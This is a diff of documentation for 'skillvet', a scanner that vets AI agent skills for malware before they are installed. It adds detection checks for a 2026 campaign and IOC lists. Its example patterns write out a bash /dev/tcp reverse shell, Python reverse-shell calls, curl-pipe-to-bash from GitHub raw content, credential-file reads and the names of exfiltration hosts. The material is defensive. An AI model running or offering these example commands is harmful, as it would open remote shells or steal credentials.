@@ -1,12 +1,12 @@
 ---
 name: skillvet
-version: 2.0.7
+version: 2.1.0
 description: Security scanner for ClawHub/community skills — detects malware, credential theft, exfiltration, prompt injection, obfuscation, homograph attacks, ANSI injection, campaign-specific attack patterns, and more before you install. Use when installing skills from ClawHub or any public marketplace, reviewing third-party agent skills for safety, or vetting untrusted code before giving it to your AI agent. Triggers: install skill, audit skill, check skill, vet skill, skill security, safe install, is this skill safe.
 ---
 
 # Skillvet
 
-Security scanner for agent skills. 37 critical checks, 8 warning checks. No dependencies — just bash and grep. Includes Tirith-inspired detection patterns, campaign signatures from [Koi Security research](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting), and [1Password blog](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface) ClickFix patterns.
+Security scanner for agent skills. 48 critical checks, 8 warning checks. No dependencies — just bash and grep. Includes Tirith-inspired detection patterns, campaign signatures from [Koi Security research](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting), [Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks), [Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/), and [1Password blog](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface) ClickFix patterns.
 
 ## Usage
 
@@ -100,6 +100,24 @@ Inspired by [1Password research](https://1password.com/blog/from-magic-to-malwar
 | 36 | Suspicious package sources | `pip install git+https://...`, npm from non-official registries |
 | 37 | Staged installer pattern | Fake dependency names like `openclaw-core`, `some-lib` |
 
+### Feb 2026 Campaign Checks (38-48)
+
+New patterns from [Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks), [Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/), and ongoing ClawHavoc campaign research.
+
+| # | Check | Example |
+|---|-------|---------|
+| 38 | Fake OS update social engineering | "Apple Software Update required for compatibility" |
+| 39 | Known malicious ClawHub actors | zaycv, Ddoy233, Sakaen736jih, Hightower6eu references |
+| 40 | Bash /dev/tcp reverse shell | `bash -i >/dev/tcp/IP/PORT 0>&1` (AuthTool pattern) |
+| 41 | Nohup backdoor | `nohup bash -c '...' >/dev/null` with network commands |
+| 42 | Python reverse shell | `socket.connect` + `dup2`, `pty.spawn('/bin/bash')` |
+| 43 | Terminal output disguise | Decoy "downloading..." message before malicious payload |
+| 44 | Credential file access | Direct reads of `.env`, `.pem`, `.aws/credentials` |
+| 45 | TMPDIR payload staging | AMOS pattern: drop malware to `$TMPDIR` then execute |
+| 46 | GitHub raw content execution | `curl raw.githubusercontent.com/... \| bash` |
+| 47 | Echo-encoded payloads | Long base64 strings echoed and piped to decoders |
+| 48 | Typosquat skill names | `clawdhub-helper`, `openclaw-cli`, `skillvet1` |
+
 ### Severity Changes (v0.5.0)
 
 - **Raw IP URLs** upgraded from WARNING → **CRITICAL** (malicious C2s commonly use raw IPs)
@@ -123,12 +141,17 @@ If the [tirith](https://github.com/sheeki03/tirith) binary is available on PATH,
 
 ## IOC Updates
 
-The C2 IP blocklist in check #25 is based on known indicators from:
+The C2 IP blocklist in check #25 and malicious actor list in check #39 are based on known indicators from:
 - [Koi Security report](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting) (Feb 2026)
+- [Bitdefender Technical Advisory](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks) (Feb 2026)
+- [Snyk ClawHub Campaign Analysis](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/) (Feb 2026)
 - [The Hacker News coverage](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
-- [OpenSourceMalware analysis](https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto)
 
-To update IOCs, edit the `KNOWN_BAD_IPS` variable in `scripts/skill-audit.sh`.
+**Exfil endpoints** (check #1): webhook.site, ngrok.io, socifiapp.com, hookbin.com, postb.in
+**C2 IPs** (check #25): 91.92.242.30, 54.91.154.110, and range patterns for common hosting
+**Malicious actors** (check #39): zaycv, Ddoy233, Sakaen736jih, aslaep123, Hightower6eu
+
+To update IOCs, edit `KNOWN_BAD_IPS` and `KNOWN_BAD_ACTORS` in `scripts/skill-audit.sh`.
 
 ## Limitations
 
